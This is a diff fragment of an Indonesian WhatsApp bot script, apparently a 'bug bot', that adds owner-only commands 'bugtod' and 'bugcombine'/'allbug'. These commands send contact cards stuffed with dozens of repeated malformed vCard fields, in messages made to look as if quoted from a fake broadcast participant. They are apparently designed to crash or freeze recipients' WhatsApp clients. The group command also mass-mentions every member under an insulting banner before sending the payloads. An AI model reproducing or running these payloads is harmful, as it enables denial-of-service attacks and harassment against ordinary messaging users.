+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}
+}})
+}
+break
+
+case 'poll':
+if (!isCreator) return reply(lang.ownerOnly())
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "HALO 👋 SAYA BOT PELER MODS WA",
+"options": [
+	{
+"optionName": "KATANYA WA KEBAL"
+	},
+	{
+"optionName": "BERANI VOTE GA"
+	},
+	{
+"optionName": "VOTE LAH SEMUA"
+	},
+	{
+"optionName": "KATANYA KEBAL"
+	},
+	{
+"optionName": "SALAM BROTHER BY PELER MODS WA"
+	}
+],
+"selectableOptionsCount": 5
+	}
+}), { userJid: m.chat, quoted: doc })
+alpha.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+//deploy('sukses sendbug')
+break
+
+case 'bugtod':
+if (!isCreator) return reply(lang.ownerOnly())
+const bugkontak = ["0"]
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© PELER MODS WA${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:PELER MODS WA\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+alpha.sendContact(m.chat, bugkontak, fkontaak)
+break
+
+case 'bugcombine': case 'bugkombo': case 'allbug': case 'allbag':
+if (!isCreator) return reply(lang.ownerOnly())
+if (!m.isGroup) return reply(lang.groupOnly())
+let toks = `══✪〘 *MAMPUS LO KONTOL️* 〙✪══
+ ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
+for (let mem of participants) {
+toks += `☠︎︎ @${mem.id.split('@')[0]}\n`
+}
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 12,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: m.chat, quoted: doc })
+const fkontol = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© HW MODS WA${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:HW MODS WA\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+await alpha.sendMessage(m.chat, { text: toks, mentions: participants.map(a => a.id) }, { quoted: doc })
+await alpha.sendMessage(m.chat, { sticker: { url: "https://telegra.ph/file/25d567b38e5a8a1d8d573.png" }},{quoted: {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}}})
+await alpha.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+await alpha.sendContact(m.chat, global.ownerr, fkontol)
+alpha.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
+break
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ BATASAN ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//punya gw        
 
